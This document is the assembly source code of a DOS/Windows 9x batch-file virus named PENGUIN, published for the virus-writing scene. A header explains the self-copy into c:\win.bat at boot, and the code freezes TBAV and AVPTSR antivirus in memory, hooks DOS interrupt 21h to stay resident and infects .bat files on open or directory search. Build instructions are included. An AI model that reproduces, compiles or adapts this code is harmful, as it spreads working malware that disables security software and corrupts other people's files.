
title                               PENGUIN

comment # ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O


How it works:
 - batch part
  If name of executed batch <> win then copy itself to c:\win.bat and
   continue the normal execution.
  When win9x boots, it launches 'win' after the autoexec.bat. The c:\win.bat
   is executed before the regular win.com in the path. It then copy itself to
   w.com, run it, delete it, and launch windoz as normal.
 - com part
  Freeze avptsr and tbav if present in memory.
  Become TSR, change PSP owner to dos, infect .bat filez on many axess.
   (check for previous / avoid autoexec.bat)

Comments:
 The advantage is that the viral code is only in .bat files, not scanned
  for viral source code. It's only detected by DrWeb. Most AVs even don't
  detect anything if you rename the batch into a .com!
 You can disinfect victimz usin edit.com :)
 It needs a buffer in ram to read the target, but it's not written on disk.
 Compile usin tasm (v2.0+) /m3 and tlink /t, rename the .com to a .bat to
  have an infected batch.

Credits to Q the Misanthrope and his Winstart virus for some ideas.


                                             >>  mandragore! <

                          ù  .  ú
merry christmas          ù .ú ù  .
to all vxer and           ú  /\ . ù
specially to all        ú . /ú \ ú          it's actually december :)
DDT memberz!             ú /____\ .
                         .  ú³³. ú
                         """"""""""

ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O*ù*O #


.model tiny
.code
.386
bptr    equ <byte ptr>
wptr    equ <word ptr>
dptr    equ <dword ptr>
hostsiz equ 2000                ;  max size of targets host
        org 100h
Start:

part1   db ':0'
        jmp comorg
        db 13,10
        db '@if %0==WIN goto j0b',13,10
        db '@ctty nul',13,10
        db 'copy %0.bat c:\win.bat',13,10
        db 'ctty con',13,10
part1sz equ $-part1

part2   db '@goto e0f',13,10
        db ':j0b',13,10
        db '@copy %0.bat w.com',13,10
        db '@w',13,10
        db '@del w.com',13,10
        db '@%winbootdir%\win',13,10
        db ':e0f',13,10
        db '@'                   ;  nul instruction to put the '' char
part2sz equ $-part2

comorg:
        call delta
delta:  pop bp                  ;  there'z a (c) ;) ?
        sub bp,offset delta

chktb:  mov ax,3d00h
        lea dx,bp+tbdrv
        int 21h
        jc chkavp
        mov ax,1605h
        mov dx,1
        xor cx,cx               ;  use func. hooked by tbav mem shields
        int 2fh                 ;  on return, es = tbdriver code seg
        mov bptr es:[291h],0    ;  freeze tbdriver (and all tbav module)

chkavp: mov si,3f5ch
        cmp wptr ds:[10],si      ;  check for int 22 hookin by AVPTSR
        jne noavp
        mov ds,ds:[12]           ;  get his datas segment
        and wptr ds:[23adh],0fch ;  disable 'access to file' and 'mem check'
        mov bptr ds:[si],0cfh    ;  freeze another way to check for the mem
noavp:

        mov es,cs:[2ch]
        mov ah,49h
        int 21h                 ;  free environmt seg

        mov ax,cs
        shl eax,16              ;  chain ints
        lea ax,bp+hook21
        push 0
        pop ds
        xchg eax,ds:[84h]
        mov [bp+old21],eax
        mov [bp+old21b],eax

        lea dx,bp+eof           ;  added room for victim
        int 27h                 ;  stay TSR

hook21: pushf
        cmp ah,43h              ;  attribz job
        je nrmif
        cmp ah,3dh              ;  open
        je nrmif
        cmp ah,6ch              ;  extended open
        je extop
        cmp ah,4eh              ;  find first
        je srnxt
        cmp ah,4fh              ;  find next
        je srnxt
        cmp ah,4dh              ;  hooked to alter PSP after int 27h
        je hide
back21: popf
        db 0eah
old21   dd ?

tbdrv   db 'TBDRVXXX',0

hide:   push ax ds
        mov ax,cs
        dec ax
        mov ds,ax
        mov wptr ds:[1],8       ;  dos owner
        pop ds ax
        jmp back21

extop:  xchg si,dx
        call infect
        xchg si,dx
        jmp back21

nrmif:  call infect
        jmp back21

srnxt:  db 9ah                  ;  postchain
old21b  dd 0
        push dx bp
        pushf
        pop dx
        mov bp,sp
        mov [bp+8],dx           ;  restore futur stack
        pop bp
        push ds si ax bx es
        mov ah,2fh
        int 21h                 ;  get DTA
        push es
        pop ds
        pop es
        mov dx,bx
        pop bx
        pop ax
        add dx,1eh
        mov si,dx
        add si,7
        cmp dptr [si],'TAB.'    ; .bat ?
        pop si
        jne $+5
        call infect
        pop ds dx
        iret

sig     db 'Ä--ù mAnDrAGorE''z pr0d!'

infect: pusha
        push ds
        mov cx,dx
        mov si,dx
        add dl,30h
        cld
bcl:    cmp si,dx
        je eoi
        lodsb
        cmp al,'.'
        jne bcl
        lodsd
        cmp eax,0+'tab'
        je okbat
        cmp eax,0+'TAB' ;  .bat ?
        jne eoi
okbat:  std
        lodsd
        lodsd
        lodsd
        cld
        cmp eax,'.CEX'  ;  *xec.bat ?  (avoid autoexec.bat)
        je eoi
        cmp eax,'.cex'  ;  *xec.bat ?  (avoid autoexec.bat)
        je eoi

        call delt2
delt2:  pop bp
        sub bp,offset delt2

        mov dx,cx
        mov ax,3d02h
        pushf
        call dptr cs:[bp+old21]
        jc eoi
        xchg ax,bx
        push cs
        pop ds

        mov ax,4202h
        xor cx,cx
        cwd
        int 21h
        or dx,dx
        jnz no_inf
        cmp ax,hostsiz          ;  too big?
        ja no_inf
        
        mov di,ax               ;  di = file size
        mov ax,4200h
        int 21h

        lea dx,bp+eoc
        mov si,dx               ;  si = offset buff
        mov ah,3fh
        mov cx,di
        int 21h
        cmp wptr [si],'0:'      ;  already infected?
        je no_inf
        xor cx,cx
        cwd
        mov ax,4200h
        int 21h

        mov ax,part1sz+part2sz-5
        add ax,di
        mov ds:[103h],ax        ;  adapt jump

        mov cx,part1sz
        mov dh,1
        mov ah,40h              ;  write 1st part
        int 21h

        mov ah,40h
        mov dx,si
        mov cx,di               ;  write host
        push ax
        int 21h

        lea dx,bp+part2
        mov cx,eoc-part2        ;  write 2nd of batch + malicious code ;)
        pop ax
        int 21h

no_inf: mov ah,3eh
        int 21h
eoi:    pop ds
        popa
        ret
eoc:
        org $+hostsiz           ;  room for victim
eof:
end start
